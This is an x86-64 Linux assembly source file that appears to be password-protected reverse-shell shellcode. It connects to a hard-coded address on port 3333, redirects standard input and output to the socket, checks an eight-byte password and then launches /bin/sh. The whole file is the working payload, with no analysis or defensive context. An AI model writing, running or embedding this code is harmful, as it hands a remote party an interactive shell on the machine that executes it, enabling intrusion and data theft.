section .text

global _start

_start:
	xor rax,rax
	xor rdi,rdi
	xor rsi,rsi
	xor rdx,rdx
	xor r10,r10

	mov al,41
	mov dil,2
	mov sil,1
	syscall

	mov rdi,rax
	mov r10,rax	

	; connect()

	push rdx
	mov dword[rsp-4],19638464
	mov word[rsp-6],0x50d
	mov word[rsp-8],0x2
	sub rsp,8
	mov rsi,rsp
	
	mov al,42
	mov dl,16
	syscall


	xor rsi,rsi	
	mov sil,2	

dup2:
	mov al,33
	syscall
	dec rsi
	jns dup2

	; read()
	inc rsi		; making rsi == 0


	mov al,sil
	sub rsp,8
	mov rsi,rsp
	mov dl,0x8
	syscall

	mov rax,0x6b6b656875646177
	mov rdi,rsi
	scasq
	jnz exit

	; execve()
	xor rax,rax
	push rax
	mov r10,0x68732f6e69622f2f
	push r10
	mov rdi,rsp	
	xor rsi,rsi
	xor rdx,rdx
	mov al,59
	syscall	
	
exit:
	mov dil,r10b
	mov al,3
	syscall

	mov al,60
	xor rdi,rdi
	syscall
